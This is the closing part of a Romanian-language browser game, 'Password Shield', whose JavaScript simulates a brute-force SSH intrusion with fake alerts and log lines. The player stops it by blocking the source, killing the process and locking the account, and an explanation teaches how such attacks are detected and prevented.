            document.getElementById("terminal-win").addEventListener("click", function () { input.focus(); });

            const alertTexts = [
                "Multe autentificări eșuate detectate",
                "Autentificare reușită de la IP necunoscut",
                "Conexiune de ieșire neobișnuită (port 4444)",
                "Transfer mare de date în curs"
            ];
            const alertShown = [false, false, false, false];

            const timer = setInterval(function () {
                if (over) return;
                const rate = 0.2 + (killed ? 0 : 0.9) + (blocked ? 0 : 0.3) + (locked ? 0 : 0.2);
                stolen = Math.min(100, stolen + rate);
                document.getElementById("stolen-pct").textContent = Math.floor(stolen) + "%";
                document.getElementById("stolen-fill").style.width = stolen + "%";
                [0, 8, 20, 40].forEach(function (t, i) {
                    if (stolen >= t && !alertShown[i]) { alertShown[i] = true; alertMsg(alertTexts[i]); }
                });
                if (!blocked && Math.random() < 0.5) {
                    liveSecond += 2;
                    const s = liveSecond < 10 ? "0" + liveSecond : liveSecond;
                    logLines.push("Oct 21 20:02:" + s + " srv01 sshd[790]: Failed password for root from " + ATTACKER + " port 4" + (1000 + liveSecond) + " ssh2");
                }
                if (stolen >= 100) endGame(false);
            }, 1000);
            cleanup = function () { clearInterval(timer); over = true; };

            function checkWin() { if (blocked && killed && locked) endGame(true); }

            function endGame(won) {
                if (over) return; over = true; clearInterval(timer);
                input.disabled = true;
                const res = document.getElementById("l3-result");
                if (won) {
                    const bonus = Math.round((100 - stolen) * 5);
                    const total = pts + bonus;
                    completeLevel(3, total);
                    const stars = mistakes === 0 && stolen < 40 ? 3 : mistakes <= 2 ? 2 : 1;
                    resultScreen(body, "🛡️ Server salvat!", stars,
                        "Ai oprit atacatorul când doar " + Math.floor(stolen) + "% din date erau furate. Greșeli: " + mistakes + ". Puncte: " + total,
                        "Un atac prin forță brută se vede în loguri ca multe încercări eșuate dintr-un singur loc, urmate de o conectare reușită. Reacția bună are trei părți: blochezi sursa, oprești ce rulează deja și închizi contul compromis. Parola slabă a fost cauza: parolele lungi și blocarea după câteva încercări greșite ar fi oprit atacul.",
                        "Felicitări, ești un apărător adevărat! Ai terminat tot Password Shield.",
                        function () { openLevel(3); });
                } else {
                    res.textContent = "";
                    const card = el("div", "card");
                    card.style.marginTop = "15px";
                    card.appendChild(el("div", "title", "💀 Date furate!"));
                    card.appendChild(el("div", "fb", "Atacatorul a copiat toate datele. Data viitoare caută mai repede în auth.log cine a încercat mai multe parole."));
                    const again = el("button", "main", "Încearcă din nou");
                    again.onclick = function () { openLevel(3); };
                    card.appendChild(again);
                    res.appendChild(card);
                    say("Ai pierdut de data asta, dar așa se învață. Încearcă din nou!");
                }
            }

            print("Conectat la cyber-srv01. Scrie 'help' pentru comenzi.", "tok");
            input.focus();
        }

        // ================= Pornire =================
        say("Salut! Ai ales Password Shield. Completează Nivelul 1 pentru a debloca Nivelul 2, apoi Nivelul 3!");
        renderMap();
    </script>
